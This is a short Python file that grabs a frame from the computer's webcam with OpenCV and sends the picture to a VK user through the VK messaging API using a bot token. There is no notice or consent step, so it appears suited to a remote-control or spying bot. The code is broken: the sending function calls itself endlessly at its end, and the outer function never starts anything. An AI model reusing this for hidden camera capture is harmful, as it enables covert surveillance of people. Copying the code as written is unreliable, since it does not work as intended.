def main_web_photo(users_id):

    def to_make_a_photo():
        import cv2

        cap = cv2.VideoCapture(0)

        for i in range(30):
            cap.read()

        ret, frame = cap.read()

        cv2.imwrite('web.png', frame)

        cap.release()

    def function_send_photo(users_id):
        from vk_api.upload import VkUpload
        from vk_api.utils import get_random_id
        import vk_api
        from utils.config import settings

        session = vk_api.VkApi(token=settings['api_group_vk'])

        to_make_a_photo()
        peer_ids = users_id

        def upload_photo(upload, photo):
            response = upload.photo_messages(photo)[0]

            owner_id = response['owner_id']
            photo_id = response['id']
            access_key = response['access_key']

            return owner_id, photo_id, access_key

        def send_photo(vk, peer_id, owner_id, photo_id, access_key):
            attachment = f'photo{owner_id}_{photo_id}_{access_key}'
            vk.messages.send(
                random_id=get_random_id(),
                peer_id=peer_id,
                attachment=attachment
            )

        def main():
            vk = session.get_api()
            upload = VkUpload(vk)

            send_photo(vk, peer_ids, *upload_photo(upload, 'web.png'))

        main()

        function_send_photo(users_id=users_id)
